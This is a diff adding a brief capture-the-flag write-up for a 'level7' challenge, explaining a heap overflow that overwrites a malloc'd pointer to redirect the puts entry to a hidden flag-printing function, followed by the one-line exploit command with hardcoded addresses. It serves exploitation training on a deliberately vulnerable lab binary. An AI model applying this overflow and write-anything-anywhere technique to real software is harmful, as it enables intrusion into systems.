@@ -1,0 +1,11 @@
+# after a lot of research and fails
+# trying to inject some shellcode on the strcpy return
+# without success. We search in the heap, and found out that
+# when the first malloc is overflowed after 20 bytes, it overrides
+# second malloc inner data which contains malloc'd data. (cf source)
+# Thus we can write anything anywhere ^^
+# There's an uncalled function m that prints the token instead of ~~
+#
+# Replacing the puts call with m call reveals the flag.
+
+/level7 $(python -c 'print "\x41" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
